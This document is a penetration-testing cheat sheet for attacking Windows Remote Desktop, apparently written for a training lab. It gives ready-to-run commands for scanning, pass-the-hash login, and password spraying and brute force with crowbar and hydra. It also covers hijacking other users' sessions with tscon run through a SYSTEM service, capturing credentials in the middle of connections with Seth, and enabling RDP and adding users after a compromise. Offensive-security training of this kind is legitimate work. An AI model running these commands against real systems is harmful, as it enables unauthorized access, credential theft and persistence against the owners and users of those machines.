# RDP (Remote Desktop Protocol)
**Default Port:** 3389 (TCP), 3389 (UDP) 
**Key Insight:** RDP is the primary GUI access for Windows. Unlike SSH, it often requires **Network Level Authentication (NLA)**, which blocks simple brute-force tools like Hydra unless configured correctly.
## 1. Discovery & Enumeration
**Goal:** Identify if RDP is open, the encryption level, and if NLA is enforced.
### Nmap (Scripts)
```shell
# Basic Discovery & OS Fingerprinting
# ⚠️ OPSEC: Low Noise.
nmap -p 3389 -sC -sV 10.129.20.13

# Check for Encryption & Vulnerabilities (BlueKeep)
nmap -p 3389 --script "rdp-enum-encryption,rdp-vuln*" 10.129.20.13
```
### RDP Security Check
**Tool:** `rdp-sec-check` (Perl script) 
**Description:** Detailed analysis of encryption settings and supported protocols.
```shell
# git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl 10.129.20.13
```
## 2. Connection (xfreerdp)
**Tool:** `xfreerdp` (Standard on Kali). 
**Note:** `rdesktop` is legacy and often fails on modern NLA-enabled servers.
**Syntax:** `xfreerdp /u:<User> /p:<Pass> /v:<IP> <Flags>`
```shell
# Standard Connection
# /dynamic-resolution: Auto-resize window
# /cert:ignore: Ignore self-signed cert errors
xfreerdp /u:administrator /p:'Password123!' /v:10.129.20.13 /dynamic-resolution /cert:ignore

# Drive Sharing (File Transfer)
# Mounts your local folder (/home/kali) to the remote machine as a network drive.
xfreerdp /u:admin /p:pass /v:10.129.20.13 /drive:share,/home/kali

# Pass-The-Hash (Restricted Admin Mode)
# Requires 'RestrictedAdmin' registry key on target.
xfreerdp /u:admin /pth:300FF5E89EF33F83A8146C10F5AB9BB9 /v:10.129.20.13
```
## 3. Password Attacks (Spraying)
**Goal:** Guess passwords. 
**Challenge:** **NLA (Network Level Authentication)** often blocks Hydra. Use **Crowbar** instead.
### Crowbar (Best for RDP/NLA)
**Install:** `sudo apt install crowbar` 
**Syntax:** `crowbar -b rdp -s <Target>/32 -U <Users> -C <Passwords>`
```shell
# Password Spraying (1 Password vs Many Users)
# -c: Single password
crowbar -b rdp -s 10.129.20.13/32 -U users.txt -c 'Welcome2024!'

# Brute Force (User list vs Password list)
crowbar -b rdp -s 10.129.20.13/32 -U users.txt -C passwords.txt
```
### Hydra (Fallback)
**Note:** Only works if NLA is disabled or widely permissive.
```shell
hydra -L users.txt -p 'Welcome2024!' rdp://10.129.20.13
```
## 4. Attack: RDP Session Hijacking
**Concept:** If you are **SYSTEM** (or local admin), you can hijack _another_ user's active RDP session without knowing their password. 
**Mechanism:** Use `tscon.exe` to connect a session (e.g., ID 2) to your current session (e.g., ID 1 or `rdp-tcp#0`).

**Step 1: Enumerate Sessions**
```powershell
query user
# Output:
# USERNAME    SESSIONNAME      ID  STATE
# admin       rdp-tcp#0        1   Active
# victim      rdp-tcp#13       2   Active  <-- Target
```

**Step 2: Create a Service (To run as SYSTEM)** We use a service because `tscon` requires SYSTEM privileges to hijack other users.
```powershell
# Create a service that executes tscon
# dest:rdp-tcp#0 = Connect victim session (ID 2) to OUR screen (rdp-tcp#0)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
```

**Step 3: Trigger the Hijack**
```powershell
net start sessionhijack
# Result: Your screen flickers and you are now viewing the Victim's desktop.
```
_Note: Patched/Restricted on Windows Server 2019+._

**Internal Enumeration**
```powershell
# Check who can RDP into a specific machine (ACADEMY-EA-MS01)
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
## 5. Attack: Man-in-the-Middle (Seth)
**Tool:** `Seth` 
**Description:** RDP MITM tool that attempts to downgrade encryption and capture keystrokes/credentials. 
**Docs:** [https://github.com/SySS-Research/Seth](https://github.com/SySS-Research/Seth)
```shell
# Syntax: ./seth.sh <Interface> <Attacker_IP> <Gateway_IP> <Target_IP>
./seth.sh eth0 10.10.14.5 10.10.10.1 10.10.10.50
```
## 6. Post-Exploitation (Enabling RDP)
**Context:** You have a shell (e.g., via PsExec or Reverse Shell) but want GUI access.
```powershell
# 1. Enable RDP via Registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 2. Allow through Firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# 3. Add User to RDP Group (Optional)
net localgroup "Remote Desktop Users" <Username> /add
```